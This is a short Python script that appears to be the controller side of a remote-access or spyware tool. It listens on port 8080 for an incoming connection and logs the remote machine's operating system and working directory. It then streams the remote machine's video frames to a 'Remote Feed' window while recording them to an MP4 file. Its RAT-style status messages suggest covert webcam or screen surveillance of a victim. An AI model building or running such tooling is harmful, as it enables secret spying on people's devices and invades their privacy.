import socket, cv2, numpy as np, threading, signal, sys

# Configuration
h, p, b = "0.0.0.0", 8080, 1024*128

# Setup socket connection
srv = socket.socket()
srv.bind((h, p))
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.listen(5)
print(f"[*] Listening on {h}:{p} ...")
conn, addr = srv.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]} Received!")

# Receive data from client
def receive_data():
    return conn.recv(b).decode()

# Get initial info from client
loc = receive_data()
sysinfo = receive_data()
print(f"[+] Operating System: {sysinfo}\n[+] Current Working Dir: {loc}")

# Video capture handler
def vcap():
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while True:
        f_size = int.from_bytes(conn.recv(4), 'little')
        if f_size == 0: continue  # Handle the case of a failed frame
        f_data = b''
        while len(f_data) < f_size:
            pkt = conn.recv(min(b, f_size - len(f_data)))
            if not pkt: break
            f_data += pkt
        if not f_data: break
        frame = cv2.imdecode(np.frombuffer(f_data, np.uint8), cv2.IMREAD_COLOR)
        if frame is None: break
        out.write(frame)
        cv2.imshow('Remote Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'): break
    out.release()
    cv2.destroyAllWindows()

# Handle Ctrl+C to prevent stopping the program abruptly
def signal_handler(signum, frame):
    print("Press 'q' to quit")

# Capture the Ctrl+C signal
signal.signal(signal.SIGINT, signal_handler)

# Start the video capture in a separate thread
t = threading.Thread(target=vcap)
t.start()

# Wait for thread completion
t.join()
conn.close()
srv.close()
